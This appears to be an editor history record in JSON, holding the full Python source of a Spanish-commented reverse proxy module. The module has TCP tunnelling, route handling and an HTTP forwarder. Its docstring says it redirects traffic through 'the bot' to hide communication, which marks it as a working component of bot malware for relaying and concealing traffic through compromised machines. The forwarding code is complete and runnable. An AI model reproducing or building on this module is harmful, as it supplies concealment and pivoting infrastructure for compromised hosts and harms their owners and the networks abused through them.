parsed.query\r\n+                            \r\n+                        # Reenviar headers\r\n+                        headers = {}\r\n+                        for line in data.split(b'\\n')[1:]:\r\n+                            line = line.strip()\r\n+                            if not line:\r\n+                                break\r\n+                            key, value = line.split(b': ', 1)\r\n+                            headers[key.decode()] = value.decode()\r\n+                            \r\n+                        # Hacer petición\r\n+                        conn.request(method.decode(), path, headers=headers)\r\n+                        response = conn.getresponse()\r\n+                        \r\n+                        # Reenviar respuesta\r\n+                        client.send(f'HTTP/1.1 {response.status} {response.reason}\\r\\n'.encode())\r\n+                        for header, value in response.getheaders():\r\n+                            client.send(f'{header}: {value}\\r\\n'.encode())\r\n+                        client.send(b'\\r\\n')\r\n+                        \r\n+                        while True:\r\n+                            chunk = response.read(8192)\r\n+                            if not chunk:\r\n+                                break\r\n+                            client.send(chunk)\r\n+                            \r\n+                except Exception as e:\r\n+                    logging.error(f\"Error en cliente HTTP: {e}\")\r\n+                finally:\r\n+                    try:\r\n+                        client.close()\r\n+                    except:\r\n+                        pass\r\n+            \r\n+            # Crear socket HTTP\r\n+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n+            server.bind((self.local_host, local_port))\r\n+            server.listen(5)\r\n+            \r\n+            # Agregar la ruta\r\n+            self.routes[(self.local_host, local_port)] = (\"HTTP\", 0)\r\n+            \r\n+            # Iniciar thread para aceptar conexiones\r\n+            threading.Thread(\r\n+                target=lambda: self._accept_http_connections(server, handle_http_client),\r\n+                daemon=True\r\n+            ).start()\r\n+            \r\n+            return True\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error creando proxy HTTP: {e}\")\r\n+            return False\r\n+\r\n+    def _accept_http_connections(self, server: socket.socket, handler):\r\n+        \"\"\"Acepta conexiones para el proxy HTTP.\"\"\"\r\n+        while self.running:\r\n+            try:\r\n+                client_socket, _ = server.accept()\r\n+                threading.Thread(target=handler, args=(client_socket,)).start()\r\n+            except Exception as e:\r\n+                if self.running:\r\n+                    logging.error(f\"Error aceptando conexión HTTP: {e}\")\r\n"
                }
            ],
            "date": 1740263542004,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de proxy reverso.\r\nPermite redirigir tráfico a través del bot para ocultar la comunicación.\r\n\"\"\"\r\n\r\nimport socket\r\nimport threading\r\nimport select\r\nimport logging\r\nimport sys\r\nimport queue\r\nimport time\r\nfrom typing import Dict, Set, Optional, Tuple\r\n\r\nclass ReverseProxy:\r\n    def __init__(self, local_host: str = \"127.0.0.1\", local_port: int = 8080):\r\n        \"\"\"\r\n        Inicializa el proxy reverso.\r\n        \r\n        Args:\r\n            local_host: Host local donde escuchar\r\n            local_port: Puerto local donde escuchar\r\n        \"\"\"\r\n        self.local_host = local_host\r\n        self.local_port = local_port\r\n        self.running = False\r\n        self.connections: Dict[socket.socket, socket.socket] = {}\r\n        self.routes: Dict[Tuple[str, int], Tuple[str, int]] = {}\r\n        self.lock = threading.Lock()\r\n        self.bufsize = 4096\r\n        self.active_tunnels: Set[Tuple[str, int]] = set()\r\n\r\n    def add_route(self, local_port: int, remote_host: str, remote_port: int) -> bool:\r\n        \"\"\"\r\n        Añade una nueva ruta de redirección.\r\n        \r\n        Args:\r\n            local_port: Puerto local a escuchar\r\n            remote_host: Host remoto destino\r\n            remote_port: Puerto remoto destino\r\n            \r\n        Returns:\r\n            bool indicando si se añadió la ruta correctamente\r\n        \"\"\"\r\n        try:\r\n            self.routes[(self.local_host, local_port)] = (remote_host, remote_port)\r\n            return True\r\n        except Exception as e:\r\n            logging.error(f\"Error añadiendo ruta: {e}\")\r\n            return False\r\n\r\n    def remove_route(self, local_port: int) -> bool:\r\n        \"\"\"\r\n        Elimina una ruta de redirección.\r\n        \r\n        Args:\r\n            local_port: Puerto local de la ruta a eliminar\r\n            \r\n        Returns:\r\n            bool indicando si se eliminó la ruta\r\n        \"\"\"\r\n        try:\r\n            del self.routes[(self.local_host, local_port)]\r\n            return True\r\n        except KeyError:\r\n            return False\r\n\r\n    def start(self) -> bool:\r\n        \"\"\"\r\n        Inicia el proxy reverso.\r\n        \r\n        Returns:\r\n            bool indicando si se inició correctamente\r\n        \"\"\"\r\n        if self.running:\r\n            return False\r\n\r\n        self.running = True\r\n        \r\n        for local_endpoint in self.routes.keys():\r\n            try:\r\n                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n                server.bind(local_endpoint)\r\n                server.listen(5)\r\n                \r\n                thread = threading.Thread(\r\n                    target=self._handle_incoming,\r\n                    args=(server, self.routes[local_endpoint]),\r\n                    daemon=True\r\n                )\r\n                thread.start()\r\n                \r\n                logging.info(f\"Proxy escuchando en {local_endpoint}\")\r\n                \r\n            except Exception as e:\r\n                logging.error(f\"Error iniciando proxy en {local_endpoint}: {e}\")\r\n                self.running = False\r\n                return False\r\n\r\n        return True\r\n\r\n    def stop(self):\r\n        \"\"\"Detiene el proxy reverso.\"\"\"\r\n        self.running = False\r\n        with self.lock:\r\n            for local_sock, remote_sock in self.connections.items():\r\n                try:\r\n                    local_sock.close()\r\n                    remote_sock.close()\r\n                except:\r\n                    pass\r\n            self.connections.clear()\r\n            self.active_tunnels.clear()\r\n\r\n    def _handle_incoming(self, server: socket.socket, remote_endpoint: Tuple[str, int]):\r\n        \"\"\"Maneja conexiones entrantes.\"\"\"\r\n        while self.running:\r\n            try:\r\n                local_socket, addr = server.accept()\r\n                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n                remote_socket.connect(remote_endpoint)\r\n                \r\n                with self.lock:\r\n                    self.connections[local_socket] = remote_socket\r\n                    self.active_tunnels.add(remote_endpoint)\r\n                \r\n                threading.Thread(\r\n                    target=self._handle_tunnel,\r\n                    args=(local_socket, remote_socket),\r\n                    daemon=True\r\n                ).start()\r\n                \r\n                logging.info(f\"Nuevo túnel: {addr} -> {remote_endpoint}\")\r\n                \r\n            except Exception as e:\r\n                logging.error(f\"Error en conexión entrante: {e}\")\r\n                continue\r\n\r\n    def _handle_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n        \"\"\"Maneja un túnel individual entre cliente y servidor.\"\"\"\r\n        while self.running:\r\n            try:\r\n                readable, _, exceptional = select.select(\r\n                    [local_socket, remote_socket],\r\n                    [],\r\n                    [local_socket, remote_socket],\r\n                    1.0\r\n                )\r\n                \r\n                if exceptional:\r\n                    break\r\n                    \r\n                for sock in readable:\r\n                    other = remote_socket if sock is local_socket else local_socket\r\n                    data = sock.recv(self.bufsize)\r\n                    \r\n                    if not data:\r\n                        return\r\n                        \r\n                    other.send(data)\r\n                    \r\n            except Exception as e:\r\n                logging.error(f\"Error en túnel: {e}\")\r\n                break\r\n                \r\n        self._cleanup_tunnel(local_socket, remote_socket)\r\n\r\n    def _cleanup_tunnel(self, local_socket: socket.socket, remote_socket: socket.socket):\r\n        \"\"\"Limpia las conexiones cuando un túnel se cierra.\"\"\"\r\n        with self.lock:\r\n            if local_socket in self.connections:\r\n                remote_endpoint = remote_socket.getpeername()\r\n                del self.connections[local_socket]\r\n                self.active_tunnels.discard(remote_endpoint)\r\n                \r\n        try:\r\n            local_socket.close()\r\n            remote_socket.close()\r\n        except:\r\n            pass\r\n\r\n    def get_active_tunnels(self) -> Set[Tuple[str, int]]:\r\n        \"\"\"\r\n        Obtiene los túneles activos.\r\n        \r\n        Returns:\r\n            Set con las tuplas (host, puerto) de los túneles activos\r\n        \"\"\"\r\n        with self.lock:\r\n            return self.active_tunnels.copy()\r\n\r\n    def get_statistics(self) -> Dict[str, int]:\r\n        \"\"\"\r\n        Obtiene estadísticas del proxy.\r\n        \r\n        Returns:\r\n            Dict con estadísticas básicas\r\n        \"\"\"\r\n        with self.lock:\r\n            return {\r\n                \"active_connections\": len(self.connections),\r\n                \"active_tunnels\": len(self.active_tunnels),\r\n                \"configured_routes\": len(self.routes)\r\n            }\r\n"
        }
    ]
}